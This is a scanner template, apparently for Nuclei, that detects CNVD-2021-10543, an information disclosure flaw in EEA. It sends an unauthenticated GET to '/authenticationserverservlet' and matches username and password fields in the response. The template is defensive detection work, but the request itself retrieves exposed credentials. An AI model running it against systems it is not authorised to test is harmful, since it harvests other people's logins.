id: CNVD-2021-10543
info:
  name: EEA - Information Disclosure
  author: pikpikcu
  severity: high
  description: The vulnerability CNVD-2021-10543 exposes EEA to potential information
    disclosure, including the unauthorized access to usernames and passwords.
  reference:
  - https://www.cnvd.org.cn/flaw/show/CNVD-2021-10543
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cwe-id: CWE-200
  tags: config,exposure,cnvd,cnvd2021
  metadata:
    impact: The impact of CNVD-2021-10543 is that EEA users' confidential information,
      including their usernames and passwords, are at risk of being exposed to unauthorized
      parties.
    recommendation: It is recommended that EEA immediately implement measures to fix
      CNVD-2021-10543 and prevent information disclosure.
requests:
- method: GET
  path:
  - '{{BaseURL}}/authenticationserverservlet'
  matchers-condition: and
  matchers:
  - type: regex
    regex:
    - <username>(.*?)</username>
    - <password>(.*?)</password>
    condition: and
  - type: status
    status:
    - 200
